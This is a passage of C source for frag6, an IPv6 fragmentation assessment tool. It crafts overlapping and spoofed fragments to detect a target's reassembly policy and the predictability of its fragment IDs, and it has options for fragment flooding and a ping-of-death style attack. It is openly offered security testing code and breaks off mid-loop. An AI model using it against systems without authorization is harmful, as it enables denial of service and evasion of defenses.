/*
 * frag6: A security assessment tool that exploits potential flaws in the
 *        processing of IPv6 fragments
 *
 * Copyright (C) 2011-2013 Fernando Gont (fgont@si6networks.com)
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 *
 * 
 * Build with: make frag6
 * 
 * This program has been tested to compile and run on: Debian GNU/Linux 6.0,
 * FreeBSD 9.0, NetBSD 5.1, OpenBSD 5.0, and Ubuntu 11.10.
 *
 * It requires that the libpcap library be installed on your system.
 *
 * Please send any bug reports to Fernando Gont <fgont@si6networks.com>
 */


#include <sys/types.h>
#include <sys/param.h>
#include <sys/socket.h>
#include <sys/select.h>

#include <stdlib.h>
#include <stdio.h>
#include <errno.h>
#include <time.h>
#include <getopt.h>
#include <unistd.h>
#include <signal.h>
#include <string.h>
#include <setjmp.h>
#include <math.h>

#include <pcap.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netinet/ip6.h>
#include <netinet/icmp6.h>
#include <net/if.h>
#include <ifaddrs.h>
#ifdef __linux__
	#include <netpacket/packet.h>
#elif defined (__FreeBSD__) || defined(__NetBSD__) || defined (__OpenBSD__) || defined(__APPLE__) || ( !defined(__FreeBSD__) && defined(__FreeBSD_kernel__))
	#include <net/if_dl.h>
#endif

#include "frag6.h"
#include "ipv6toolkit.h"
#include "libipv6.h"
#include <netinet/tcp.h>


/* Function prototypes */
int					predict_frag_id(u_int32_t *, unsigned int, u_int32_t *, unsigned int);
void				print_attack_info(struct iface_data *);
void				print_help(void);
void 				print_icmp6_echo(struct iface_data *, struct pcap_pkthdr *, const u_char *);
void 				print_icmp6_timed(struct iface_data *, struct pcap_pkthdr *, const u_char *);
void 				process_icmp6_echo(struct iface_data *, struct pcap_pkthdr *, const u_char *, unsigned char *, unsigned int *);
void 				process_icmp6_timed(struct iface_data *, struct pcap_pkthdr *, const u_char *, unsigned char *);
int					send_fid_probe(struct iface_data *);
int 				send_fragment(struct iface_data *, unsigned int, unsigned int, unsigned int, unsigned int, unsigned int);
int 				send_fragment2(struct iface_data *, u_int16_t, unsigned int, unsigned int, unsigned int, unsigned int, char *);
int					test_frag_pattern(unsigned char *, unsigned int, char *);
void				usage(void);
int 				valid_icmp6_response(struct iface_data *, struct pcap_pkthdr *, const u_char *);
int					valid_icmp6_response2(struct iface_data *, struct pcap_pkthdr *, const u_char *, unsigned int);

/* Used for router discovery */
struct iface_data	idata;
struct prefix_entry	*prefix_ols[MAX_PREFIXES_ONLINK], *prefix_acs[MAX_PREFIXES_AUTO];
struct prefix_entry	*prefix_local[MAX_LOCAL_ADDRESSES];
struct in6_addr		randprefix;
unsigned char		randpreflen;

/* Data structures for packets read from the wire */
struct pcap_pkthdr	*pkthdr;
const u_char		*pktdata;
unsigned char		*pkt_end, *pkt_ptr;
struct ether_header	*pkt_ether;
struct ip6_hdr		*pkt_ipv6;
struct ip6_frag		*pkt_fh;
struct icmp6_hdr	*pkt_icmp6;
struct nd_neighbor_solicit *pkt_ns;
struct in6_addr		*pkt_ipv6addr;
unsigned int		pktbytes;


bpf_u_int32			my_netmask;
bpf_u_int32			my_ip;
struct bpf_program	pcap_filter;
char 				dev[64], errbuf[PCAP_ERRBUF_SIZE];
unsigned char		buffer[65556], buffrh[MIN_IPV6_HLEN + MIN_TCP_HLEN];
unsigned char		*v6buffer, *ptr, *startofprefixes;
char				*pref;
    
struct ip6_hdr		*ipv6;
struct icmp6_hdr	*icmp6;

struct ether_header	*ethernet;
struct dlt_null		*dlt_null;
struct nd_opt_tlla	*tllaopt;

struct ether_addr	linkaddr[MAX_TLLA_OPTION];
unsigned int		nlinkaddr=0, linkaddrs;

char				*lasts, *rpref;
char				*charptr;

size_t				nw;
unsigned long		ul_res, ul_val;
unsigned int		i, j, startrand;
unsigned int		skip;
unsigned int		frags, nfrags, nsleep;
u_int16_t			mask, ip6length;
u_int8_t			hoplimit;

char 				plinkaddr[ETHER_ADDR_PLEN];
char 				psrcaddr[INET6_ADDRSTRLEN], pdstaddr[INET6_ADDRSTRLEN], pv6addr[INET6_ADDRSTRLEN];
unsigned char 		verbose_f=0;
unsigned char 		floodf_f=0;
unsigned char 		loop_f=0, sleep_f=0, localaddr_f=0, tstamp_f=1, pod_f=0;
unsigned char		srcprefix_f=0, hoplimit_f=0, ip6length_f=0, icmp6psize_f=0;
unsigned char		fsize_f=0, forder_f=0, foffset_f=0, fid_f=0, fragp_f=0, fragidp_f=0, resp_f=1;

u_int32_t			fsize, foffset, fid, id;
unsigned int		forder, overlap, minfragsize;

/* Support for Extension Headers */
unsigned int		dstopthdrs, dstoptuhdrs, hbhopthdrs;
char				hbhopthdr_f=0, dstoptuhdr_f=0, dstopthdr_f=0;
unsigned char		*dstopthdr[MAX_DST_OPT_HDR], *dstoptuhdr[MAX_DST_OPT_U_HDR];
unsigned char		*hbhopthdr[MAX_HBH_OPT_HDR];
unsigned int		dstopthdrlen[MAX_DST_OPT_HDR], dstoptuhdrlen[MAX_DST_OPT_U_HDR];
unsigned int		hbhopthdrlen[MAX_HBH_OPT_HDR], m, pad;

struct ip6_frag		*fh;
struct ip6_hdr		*fipv6;

unsigned char		*fragpart, *ptrend, *ptrhdr, *ptrhdrend;
unsigned int		hdrlen, ndstopthdr=0, nhbhopthdr=0, ndstoptuhdr=0;
unsigned int		nfrags, fragsize, max_packet_size;
unsigned char		*prev_nh, *startoffragment;


/* Basic data blocks used for detecting the fragment reassembly policy. They contain the same words
 * in different order, thus resulting in the same checksum
 */
#define				FRAG_BLOCK_SIZE 8
char				block1[8]={'a', 'a', 'b', 'b', 'c', 'c', 'd', 'd'};
char				block2[8]={'b', 'b', 'a', 'a', 'c', 'c', 'd', 'd'};
char				block3[8]={'c', 'c', 'a', 'a', 'b', 'b', 'd', 'd'};
char				block4[8]={'d', 'd', 'a', 'a', 'b', 'b', 'c', 'c'};
char				block5[8]={'d', 'd', 'c', 'c', 'b', 'b', 'a', 'a'};
char				block6[8]={'c', 'c', 'd', 'd', 'b', 'b', 'a', 'a'};
char				block7[8]={'b', 'b', 'd', 'd', 'c', 'c', 'a', 'a'};
char				block8[8]={'a', 'a', 'd', 'd', 'c', 'c', 'b', 'b'};


/* For the sampling of Fragment Identification values */
u_int16_t			addr_sig, addr_key;
u_int32_t			icmp6_sig;

int main(int argc, char **argv){
	extern char		*optarg;	
	char			*endptr; /* Used by strtoul() */
	fd_set			sset, rset;
	struct timeval	timeout;
	int				r, sel;
	time_t			curtime, start, lastfrag=0, lastfrag1=0, lastfrag2=0;
	time_t			lastfrag3=0, lastfrag4=0, lastfrag5=0;
	unsigned int	responses=0, maxsizedchunk;

	/* Array for storing the Fragment reassembly policy test results */
	unsigned char	test[5];

	/* Arrays for storing the Fragment ID samples */
	u_int32_t		test1[NSAMPLES], test2[NSAMPLES];
	unsigned int	ntest1=0, ntest2=0;
	unsigned char	testtype;

	static struct option longopts[] = {
		{"interface", required_argument, 0, 'i'},
		{"link-src-addr", required_argument, 0, 'S'},
		{"link-dst-addr", required_argument, 0, 'D'},
		{"src-address", required_argument, 0, 's'},
		{"dst-address", required_argument, 0, 'd'},
		{"hop-limit", required_argument, 0, 'A'},
		{"dst-opt-hdr", required_argument, 0, 'u'},
		{"dst-opt-u-hdr", required_argument, 0, 'U'},
		{"hbh-opt-hdr", required_argument, 0, 'H'},
		{"frag-size", required_argument, 0, 'P'},
		{"frag-type", required_argument, 0, 'O'},
		{"frag-offset", required_argument, 0, 'o'},
		{"frag-id", required_argument, 0, 'I'},
		{"no-timestamp", no_argument, 0, 'T'},
		{"no-responses", no_argument, 0, 'n'},
		{"frag-reass-policy", no_argument, 0, 'p'},
		{"frag-id-policy", no_argument, 0, 'W'},
		{"pod-attack", no_argument, 0, 'X'},
		{"flood-frags", required_argument, 0, 'F'},
		{"loop", no_argument, 0, 'l'},
		{"sleep", required_argument, 0, 'z'},
		{"verbose", no_argument, 0, 'v'},
		{"help", no_argument, 0, 'h'}
	};

	char shortopts[]= "i:S:D:s:d:A:u:U:H:P:O:o:I:TnpWXF:lz:vh";

	char option;

	if(argc<=1){
		usage();
		exit(EXIT_FAILURE);
	}


	srandom(time(NULL));
	hoplimit=64+random()%180;
	init_iface_data(&idata);

	while((r=getopt_long(argc, argv, shortopts, longopts, NULL)) != -1) {
		option= r;

		switch(option) {
			case 'i':  /* Interface */
				strncpy(idata.iface, optarg, IFACE_LENGTH-1);
				idata.iface[IFACE_LENGTH-1]=0;
				idata.ifindex= if_nametoindex(idata.iface);
				idata.iface_f=TRUE;
				break;

			case 's':	/* IPv6 Source Address */
				if((charptr = strtok_r(optarg, "/", &lasts)) == NULL){
					puts("Error in Source Address");
					exit(EXIT_FAILURE);
				}

				if ( inet_pton(AF_INET6, charptr, &(idata.srcaddr)) <= 0){
					puts("inet_pton(): Source Address not valid");
					exit(EXIT_FAILURE);
				}

				idata.srcaddr_f = 1;
		
				if((charptr = strtok_r(NULL, " ", &lasts)) != NULL){
					idata.srcpreflen = atoi(charptr);
		
					if(idata.srcpreflen>128){
						puts("Prefix length error in IPv6 Source Address");
						exit(EXIT_FAILURE);
					}

					sanitize_ipv6_prefix(&(idata.srcaddr), idata.srcpreflen);
					idata.srcprefix_f=1;
				}

				break;
	    
			case 'd':	/* IPv6 Destination Address */
				if( inet_pton(AF_INET6, optarg, &(idata.dstaddr)) <= 0){
					puts("inet_pton(): address not valid");
					exit(EXIT_FAILURE);
				}
		
				idata.dstaddr_f = 1;
				break;

			case 'A':	/* Hop Limit */
				hoplimit= atoi(optarg);
				hoplimit_f=1;
				break;

			case 'u':	/* Destinations Options Header */
				if(ndstopthdr >= MAX_DST_OPT_HDR){
					puts("Too many Destination Options Headers");
					exit(EXIT_FAILURE);
				}

				hdrlen= atoi(optarg);
		
				if(hdrlen < 8){
					puts("Bad length in Destination Options Header");
					exit(EXIT_FAILURE);
				}
		    
				hdrlen = ((hdrlen+7)/8) * 8;
				dstopthdrlen[ndstopthdr]= hdrlen;

				if( (dstopthdr[ndstopthdr]= malloc(hdrlen)) == NULL){
					puts("Not enough memory for Destination Options Header");
					exit(EXIT_FAILURE);
				}

				ptrhdr= dstopthdr[ndstopthdr] + 2;
				ptrhdrend= dstopthdr[ndstopthdr] + hdrlen;

				while( ptrhdr < ptrhdrend){

					if( (ptrhdrend-ptrhdr)>257)
						pad= 257;
					else
						pad= ptrhdrend-ptrhdr;
			
					if(!insert_pad_opt(ptrhdr, ptrhdrend, pad)){
						puts("Destination Options Header Too Big");
						exit(EXIT_FAILURE);
					}
		    
					ptrhdr= ptrhdr + pad;
				}

				*(dstopthdr[ndstopthdr]+1)= (hdrlen/8)-1;
				ndstopthdr++;
				dstopthdr_f=1;
				break;

			case 'U':	/* Destination Options Header (Unfragmentable Part) */
				if(ndstoptuhdr >= MAX_DST_OPT_U_HDR){
					puts("Too many Destination Options Headers (Unfragmentable Part)");
					exit(EXIT_FAILURE);
				}

				hdrlen= atoi(optarg);
		
				if(hdrlen < 8){
					puts("Bad length in Destination Options Header (Unfragmentable Part)");
					exit(EXIT_FAILURE);
				}

				hdrlen = ((hdrlen+7)/8) * 8;
				dstoptuhdrlen[ndstoptuhdr]= hdrlen;
		
				if( (dstoptuhdr[ndstoptuhdr]= malloc(hdrlen)) == NULL){
					puts("Not enough memory for Destination Options Header (Unfragmentable Part)");
					exit(EXIT_FAILURE);
				}

				ptrhdr= dstoptuhdr[ndstoptuhdr]+2;
				ptrhdrend= dstoptuhdr[ndstoptuhdr] + hdrlen;
		
				while( ptrhdr < ptrhdrend){

					if( (ptrhdrend-ptrhdr)>257)
						pad= 257;
					else
						pad= ptrhdrend-ptrhdr;

					if(!insert_pad_opt(ptrhdr, ptrhdrend, pad)){
						puts("Destination Options Header (Unfragmentable Part) Too Big");
						exit(EXIT_FAILURE);
					}

					ptrhdr = ptrhdr + pad;
				}

				*(dstoptuhdr[ndstoptuhdr]+1)= (hdrlen/8) - 1;
				ndstoptuhdr++;
				dstoptuhdr_f=1;
				break;

			case 'H':	/* Hop-by-Hop Options Header */
				if(nhbhopthdr >= MAX_HBH_OPT_HDR){
					puts("Too many Hop-by-Hop Options Headers");
					exit(EXIT_FAILURE);
				}

				hdrlen= atoi(optarg);
		
				if(hdrlen <= 8){
					puts("Bad length in Hop-by-Hop Options Header");
					exit(EXIT_FAILURE);
				}
		    
				hdrlen = ((hdrlen+7)/8) * 8;
				hbhopthdrlen[nhbhopthdr]= hdrlen;
		
				if( (hbhopthdr[nhbhopthdr]= malloc(hdrlen)) == NULL){
					puts("Not enough memory for Hop-by-Hop Options Header");
					exit(EXIT_FAILURE);
				}

				ptrhdr= hbhopthdr[nhbhopthdr] + 2;
				ptrhdrend= hbhopthdr[nhbhopthdr] + hdrlen;
		
		
				while( ptrhdr < ptrhdrend){

					if( (ptrhdrend-ptrhdr)>257)
						pad= 257;
					else
						pad= ptrhdrend-ptrhdr;

					if(!insert_pad_opt(ptrhdr, ptrhdrend, pad)){
						puts("Hop-by-Hop Options Header Too Big");
						exit(EXIT_FAILURE);
					}

					ptrhdr = ptrhdr + pad;
				}

				*(hbhopthdr[nhbhopthdr]+1)= (hdrlen/8) - 1;
				nhbhopthdr++;
				hbhopthdr_f=1;
				break;

			case 'S':	/* Source Ethernet address */
				if(ether_pton(optarg, &(idata.hsrcaddr), sizeof(idata.hsrcaddr)) == 0){
					puts("Error in Source link-layer address.");
					exit(EXIT_FAILURE);
				}
		
				idata.hsrcaddr_f = 1;
				break;

			case 'D':	/* Destination Ethernet Address */
				if(ether_pton(optarg, &(idata.hdstaddr), sizeof(idata.hdstaddr)) == 0){
					puts("Error in Source link-layer address.");
					exit(EXIT_FAILURE);
				}
		
				idata.hdstaddr_f = 1;
				break;

			case 'P':	/* Fragment Size*/
				fsize= atoi(optarg);
				fsize_f= 1;
				break;

			case 'O':	/* Fragment Type */
				if(strncmp(optarg, "first", MAX_STRING_SIZE) == 0){
					forder= FIRST_FRAGMENT;
					forder_f=1;
				}
				else if(strncmp(optarg, "last", MAX_STRING_SIZE) == 0){
					forder= LAST_FRAGMENT;
					forder_f=1;
				}
				else if(strncmp(optarg, "middle", MAX_STRING_SIZE) == 0){
					forder= MIDDLE_FRAGMENT;
					forder_f=1;
				}
				else if(strncmp(optarg, "atomic", MAX_STRING_SIZE) == 0){
					forder= ATOMIC_FRAGMENT;
					forder_f=1;
				}
				else{
					puts("Unknown fragment order (valid order types: 'first', 'last', 'middle')");
					exit(EXIT_FAILURE);
				}

				break;

			case 'o':	/* Fragment Offset */
				if((ul_res = strtoul(optarg, &endptr, 0)) == ULONG_MAX){
					perror("Error in 'Fragment Offset' parameter");
					exit(EXIT_FAILURE);
				}
		
				if(endptr != optarg){
					foffset = ul_res;
					foffset_f=1;
				}

				break;

			case 'I':	/* Fragment Identification */
				if((ul_res = strtoul(optarg, &endptr, 0)) == ULONG_MAX){
					perror("Error in 'Fragment Identification' parameter");
					exit(EXIT_FAILURE);
				}
		
				if(endptr != optarg){
					fid = ul_res;
					fid_f=1;
				}

				break;

			case 'T': /* Do not include timestamp in fragment */
				tstamp_f=0;
				break;

			case 'n': /* Do not show responses */
				resp_f=0;
				break;

			case 'p':	/* Assess the fragment reassembly policy of the target */
				fragp_f= 1;
				break;

			case 'W':	/* Assess the fragment id generation policy of the target */
				fragidp_f= 1;
				break;

			case 'F':	/* Flood target with fragments */
				nfrags= atoi(optarg);
				if(nfrags == 0){
					puts("Invalid number of fragments in option -F");
					exit(EXIT_FAILURE);
				}
		
				floodf_f= 1;
				break;

			case 'X':
				pod_f=1;
				break;

			case 'l':	/* "Loop mode */
				loop_f = 1;
				break;

			case 'z':	/* Sleep option */
				nsleep=atoi(optarg);
				if(nsleep==0){
					puts("Invalid number of seconds in '-z' option");
					exit(EXIT_FAILURE);
				}
	
				sleep_f=1;
				break;

			case 'v':	/* Be verbose */
				idata.verbose_f++;
				break;
		
			case 'h':	/* Help */
				print_help();
		
				exit(EXIT_FAILURE);
				break;

			default:
				usage();
				exit(EXIT_FAILURE);
				break;
		
		} /* switch */
	} /* while(getopt) */

	verbose_f= idata.verbose_f;

	if(geteuid()) {
		puts("frag6 needs root privileges to run.");
		exit(EXIT_FAILURE);
	}

	if(!idata.iface_f){
		if(idata.dstaddr_f && IN6_IS_ADDR_LINKLOCAL(&(idata.dstaddr))){
			puts("Must specify a network interface for link-local destinations");
			exit(EXIT_FAILURE);
		}
	}

	if(load_dst_and_pcap(&idata, LOAD_SRC_NXT_HOP) == FAILURE){
		puts("Error while learning Souce Address and Next Hop");
		exit(EXIT_FAILURE);
	}

	release_privileges();

	if((idata.ip6_local_flag && idata.ip6_global_flag) && !idata.srcaddr_f)
		localaddr_f=1;

	if(!sleep_f)
		nsleep=QUERY_TIMEOUT;

	max_packet_size = MAX_IPV6_PAYLOAD + MIN_IPV6_HLEN;

	if(idata.verbose_f){
		print_attack_info(&idata);
	}

	if(!idata.dstaddr_f){
		puts("Error: Nothing to send! (Destination Address left unspecified)");
		exit(EXIT_FAILURE);
	}

	if(!floodf_f)
		nfrags=1;

	if(!forder_f)
		forder= MIDDLE_FRAGMENT;

	/* Assess the Fragment Reassembly policy */
	if(fragp_f){
		puts("Identifying fragment reassembly policy of the target node....");

		/*
		   Set filter for receiving Neighbor Solicitations, ICMPv6 Echo Responses, and ICMPv6 Time Exceeded
		 */
		if(pcap_compile(idata.pfd, &pcap_filter, PCAP_ICMPV6_NSECHOEXCEEDED_FILTER, PCAP_OPT, PCAP_NETMASK_UNKNOWN) == -1){
			printf("pcap_compile(): %s\n", pcap_geterr(idata.pfd));
			exit(EXIT_FAILURE);
		}
		
		if(pcap_setfilter(idata.pfd, &pcap_filter) == -1){
			printf("pcap_setfilter(): %s\n", pcap_geterr(idata.pfd));
			exit(EXIT_FAILURE);
		}

		pcap_freecode(&pcap_filter);

		/* Initialize the table of results for the different tests */
		for(i=0; i<5; i++)
			test[i]= TIMED_OUT;

		/*
		   These two variables select the fragment "overlap" size for the tests, and the minimum fragment size.
		   They are currently hardcoded, but will be configurable in future revisions of the tool.
		 */
		overlap=8;
		minfragsize= 8*10;

		/*
		   Since the current version of the tool does not reassemble response packets, we need to prevent
		   response packets from employing fragmentation. The maximum-sized packets that we send is composed
		   of a 4*minfragsize payload plus IPv6 and ICMPv6 headers -- hence the check bellow.
		 */
		if(minfragsize > ((idata.mtu - sizeof(struct ip6_hdr) - sizeof(struct icmp6_hdr))/4)){
			puts("Error: minimum fragment size is too large");
			exit(EXIT_FAILURE);
		}

		if(overlap < 8 || (overlap%8) != 0 || overlap >= minfragsize){
			puts("Error: Incorrect 'overlap' value");
			exit(EXIT_FAILURE);
		}

		if( (idata.fd= pcap_fileno(idata.pfd)) == -1){
			puts("Error obtaining descriptor number for pcap_t");
			exit(EXIT_FAILURE);
		}

		FD_ZERO(&sset);
		FD_SET(idata.fd, &sset);
		start= time(NULL);
		lastfrag1= start - QUERY_TIMEOUT/2;
		lastfrag2= start - QUERY_TIMEOUT/2 + 1;
		lastfrag3= start - QUERY_TIMEOUT/2 + 2;
		lastfrag4= start - QUERY_TIMEOUT/2 + 3;
		lastfrag5= start - QUERY_TIMEOUT/2 + 4;
		responses=0;

		while(1){
			curtime=time(NULL);

			if((curtime - start) >= QUERY_TIMEOUT || responses >= 5){
				break;
			}

			if((curtime - lastfrag1) >= QUERY_TIMEOUT/2 && (test[0]== TIMED_OUT || test[0]==TIME_EXCEEDED)){
				if(idata.verbose_f)
					puts("Sending Fragments for Test #1....");

				id= random();

				if(send_fragment2(&idata, sizeof(struct icmp6_hdr)+minfragsize*2-overlap, id, 0, minfragsize, \
									FIRST_FRAGMENT, block1) == -1){
				}

				if(send_fragment2(&idata, 0, id, sizeof(struct icmp6_hdr)+minfragsize-overlap, minfragsize, \
									LAST_FRAGMENT, block6) == -1){
				}

				lastfrag1=curtime;
				continue;
			}

			if((curtime - lastfrag2) >= QUERY_TIMEOUT/2 && (test[1]== TIMED_OUT || test[1]==TIME_EXCEEDED)){
				if(idata.verbose_f)
					puts("Sending Fragments for Test #2....");

				id= random();

				if(send_fragment2(&idata, sizeof(struct icmp6_hdr)+minfragsize * 3-overlap, id, 0, minfragsize, \
									FIRST_FRAGMENT, block2) == -1){
				}

				if(send_fragment2(&idata, 0, id, sizeof(struct icmp6_hdr)+minfragsize * 2-overlap, minfragsize, \
									LAST_FRAGMENT, block6) == -1){
				}

				if(send_fragment2(&idata, 0, id, sizeof(struct icmp6_hdr)+minfragsize-overlap, minfragsize, \
									MIDDLE_FRAGMENT, block7) == -1){
				}

				lastfrag2=curtime;
				continue;
			}

			if((curtime - lastfrag3) >= QUERY_TIMEOUT/2 && (test[2]== TIMED_OUT || test[2]==TIME_EXCEEDED)){
				if(idata.verbose_f)
					puts("Sending Fragments for Test #3....");

				id= random();

				if(send_fragment2(&idata, sizeof(struct icmp6_hdr)+minfragsize * 3-overlap, id, 0, minfragsize, \
									FIRST_FRAGMENT, block3) == -1){
				}

				if(send_fragment2(&idata, 0, id, sizeof(struct icmp6_hdr)+minfragsize * 2-overlap, minfragsize, \
									LAST_FRAGMENT, block6) == -1){
				}

				if(send_fragment2(&idata, 0, id, sizeof(struct icmp6_hdr)+minfragsize, minfragsize, MIDDLE_FRAGMENT, \
									block7) == -1){
				}

				lastfrag3=curtime;
				continue;
			}


			if((curtime - lastfrag4) >= QUERY_TIMEOUT/2 && (test[3]== TIMED_OUT || test[3]==TIME_EXCEEDED)){
				if(idata.verbose_f)
					puts("Sending Fragments for Test #4....");

				id= random();

				if(send_fragment2(&idata, sizeof(struct icmp6_hdr)+minfragsize *4, id, 0, minfragsize, FIRST_FRAGMENT, \
									block4) == -1){
				}

				if(send_fragment2(&idata, 0, id, sizeof(struct icmp6_hdr)+minfragsize * 2, minfragsize, MIDDLE_FRAGMENT, \
									block6) == -1){
				}

				if(send_fragment2(&idata, 0, id, sizeof(struct icmp6_hdr)+minfragsize, minfragsize *3, LAST_FRAGMENT, \
									block7) == -1){
				}

				lastfrag4=curtime;
				continue;
			}


			if((curtime - lastfrag5) >= QUERY_TIMEOUT/2 && (test[4]== TIMED_OUT || test[4]==TIME_EXCEEDED)){
				if(idata.verbose_f)
					puts("Sending Fragments for Test #5....");

				id= random();

				if(send_fragment2(&idata, sizeof(struct icmp6_hdr)+minfragsize * 4 - overlap, id, 0, minfragsize, \
									FIRST_FRAGMENT, block5) == -1){
					puts("Error when writing fragment");
					exit(EXIT_FAILURE);
				}

				if(send_fragment2(&idata, 0, id, sizeof(struct icmp6_hdr)+minfragsize * 2, minfragsize, MIDDLE_FRAGMENT, \
									block6) == -1){
					puts("Error when writing fragment");
					exit(EXIT_FAILURE);
				}

				if(send_fragment2(&idata, 0, id, sizeof(struct icmp6_hdr)+minfragsize * 3 - overlap, minfragsize, \
									LAST_FRAGMENT, block7) == -1){
					puts("Error when writing fragment");
					exit(EXIT_FAILURE);
				}

				if(send_fragment2(&idata, 0, id, sizeof(struct icmp6_hdr)+minfragsize, minfragsize, MIDDLE_FRAGMENT, \
									block8) == -1){
					puts("Error when writing fragment");
					exit(EXIT_FAILURE);
				}

				lastfrag5=curtime;
			}

			rset= sset;
			timeout.tv_usec=0;
			timeout.tv_sec= 1;

			if((sel=select(idata.fd+1, &rset, NULL, NULL, &timeout)) == -1){
				if(errno == EINTR){
					continue;
				}
				else{
					puts("Error in select()");
					exit(EXIT_FAILURE);
				}
			}

			if(sel == 0)
				continue;

			/* Read a packet (Echo Reply, ICMPv6 Error, or Neighbor Solicitation) */
			if((r=pcap_next_ex(idata.pfd, &pkthdr, &pktdata)) == -1){
				printf("pcap_next_ex(): %s", pcap_geterr(idata.pfd));
				exit(EXIT_FAILURE);
			}
			else if(r == 0){
				continue; /* Should never happen */
			}

			pkt_ether = (struct ether_header *) pktdata;
			pkt_ipv6 = (struct ip6_hdr *)((char *) pkt_ether + idata.linkhsize);
			pkt_icmp6 = (struct icmp6_hdr *) ((char *) pkt_ipv6 + sizeof(struct ip6_hdr));
			pkt_ns= (struct nd_neighbor_solicit *) pkt_icmp6;
			pkt_end = (unsigned char *) pktdata + pkthdr->caplen;

			if( (pkt_end -  pktdata) < (idata.linkhsize + MIN_IPV6_HLEN))
				continue;

			if(pkt_ipv6->ip6_nxt == IPPROTO_ICMPV6){
				if(idata.type == DLT_EN10MB && idata.flags != IFACE_LOOPBACK && pkt_icmp6->icmp6_type == ND_NEIGHBOR_SOLICIT){
					if( (pkt_end - (unsigned char *) pkt_ns) < sizeof(struct nd_neighbor_solicit))
						continue;
					/* 
					    If the addresses that we're using are not actually configured on the local system
					    (i.e., they are "spoofed", we must check whether it is a Neighbor Solicitation for 
					    one of our addresses, and respond with a Neighbor Advertisement. Otherwise, the kernel
					    will take care of that.
					 */
					if(idata.type == DLT_EN10MB && idata.flags != IFACE_LOOPBACK && !localaddr_f && \
									is_eq_in6_addr(&(pkt_ns->nd_ns_target), &idata.srcaddr)){
							if(send_neighbor_advert(&idata, idata.pfd, pktdata) == -1){
								puts("Error sending Neighbor Advertisement");
								exit(EXIT_FAILURE);
							}
					}
				}
				else if( (pkt_icmp6->icmp6_type == ICMP6_ECHO_REPLY) || (pkt_icmp6->icmp6_type == ICMP6_TIME_EXCEEDED)){
					if( (pkt_end - (unsigned char *) pkt_icmp6) < sizeof(struct icmp6_hdr))
						continue;

					switch(pkt_icmp6->icmp6_type){
						case ICMP6_ECHO_REPLY:
							process_icmp6_echo(&idata, pkthdr, pktdata, test, &responses);
							break;

						case ICMP6_TIME_EXCEEDED:
							process_icmp6_timed(&idata, pkthdr, pktdata, test);
							break;
					}
				}
			}
		}

		for(i=0;i<5;i++){
			printf("Test #%u: ", (i+1));
			switch(test[i]){
				case FIRST_COPY:
					puts("Target preferred first copy of overlapping data");
					break;

				case LAST_COPY:
					puts("Target preferred last copy of overlapping data");
					break;

				case TIME_EXCEEDED:
					puts("Received ICMPv6 Time Exceeded error message (fragments discarded)");
					break;

				case TIMED_OUT:
					puts("Timed out (fragments discarded without notification)");
					break;

				case UNKNOWN_COPY:
					puts("Unknown pattern in response (shouldn't happen!)");
					break;
			}
		}

		exit(EXIT_SUCCESS);
	}


	/* Assess the Fragment ID generation policy */
	if(fragidp_f){
		puts("Identifying the 'Fragment ID' generation policy of the target node....");

		/*
		   Set filter for receiving Neighbor Solicitations, and fragmented ICMPv6 Echo Responses
		 */
		if(pcap_compile(idata.pfd, &pcap_filter, PCAP_ICMPV6NSFRAG_FILTER, PCAP_OPT, PCAP_NETMASK_UNKNOWN) == -1){
			printf("pcap_compile(): %s\n", pcap_geterr(idata.pfd));
			exit(EXIT_FAILURE);
		}
		
		if(pcap_setfilter(idata.pfd, &pcap_filter) == -1){
			printf("pcap_setfilter(): %s\n", pcap_geterr(idata.pfd));
			exit(EXIT_FAILURE);
		}

		pcap_freecode(&pcap_filter);

		FD_ZERO(&sset);
		FD_SET(idata.fd, &sset);
		start= time(NULL);
		lastfrag1=0;		
		ntest1=0;
		ntest2=0;
		icmp6_sig= random();
		testtype= FIXED_ORIGIN;

		if(idata.srcprefix_f){
			randprefix=idata.srcaddr;
			randpreflen=idata.srcpreflen;
		}
		else{
			randprefix= idata.srcaddr;
			randpreflen=64;
			sanitize_ipv6_prefix(&randprefix, randpreflen);
		}

		while(1){
			curtime=time(NULL);

			if( testtype==FIXED_ORIGIN && ((curtime - start) >= FID_ASSESS_TIMEOUT || ntest1 >= NSAMPLES)){
				testtype= MULTI_ORIGIN;
				addr_sig= random();
				addr_key= random();
				start= curtime;
				continue;
			}
			else if( testtype==MULTI_ORIGIN && ((curtime - start) >= FID_ASSESS_TIMEOUT || ntest2 >= NSAMPLES)){
				break;
			}

			if((curtime - lastfrag1) >= 1){
				if(testtype == FIXED_ORIGIN){
					for(i=0; i< (NSAMPLES/NBATCHES); i++){
						if(send_fid_probe(&idata) == -1){
							puts("Error while sending packet");
							exit(EXIT_FAILURE);
						}
					}
				}
				else{
					for(i=0; i< (NSAMPLES/NBATCHES); i++){
						randomize_ipv6_addr(&(idata.srcaddr), &randprefix, randpreflen);

						/*
						 * Two words of the Source IPv6 Address are specially encoded such that we only respond
						 * to Neighbor Solicitations that target those addresses, and accept ICMPv6 Echo Replies
						 * only if they are destined to those addresses
						 */
						idata.srcaddr.s6_addr16[5]= addr_sig;
						idata.srcaddr.s6_addr16[7] =  idata.srcaddr.s6_addr16[6] ^ addr_key;

						/*
						 * XXX This trick is innefective with OpenBSD. Hence we don't try to prevent the
						 * first-fragment of the response packet from being dropped.

						if(send_neighbor_solicit(&idata) == -1){
							puts("Error while sending Neighbor Solicitation");
							exit(EXIT_FAILURE);
						}
						*/

						if(send_fid_probe(&idata) == -1){
							puts("Error while sending packet");
							exit(EXIT_FAILURE);
						}
					}
				}

				lastfrag1=curtime;
				continue;
			}

			rset= sset;
			timeout.tv_usec=0;
			timeout.tv_sec= 1;

			if((sel=select(idata.fd+1, &rset, NULL, NULL, &timeout)) == -1){
				if(errno == EINTR){
					continue;
				}
				else{
					puts("Error in select()");
					exit(EXIT_FAILURE);
				}
			}

			if(sel == 0)
				continue;

			/* Read a packet (Echo Reply, or Neighbor Solicitation) */
			if((r=pcap_next_ex(idata.pfd, &pkthdr, &pktdata)) == -1){
				printf("pcap_next_ex(): %s", pcap_geterr(idata.pfd));
				exit(EXIT_FAILURE);
			}
			else if(r == 0){
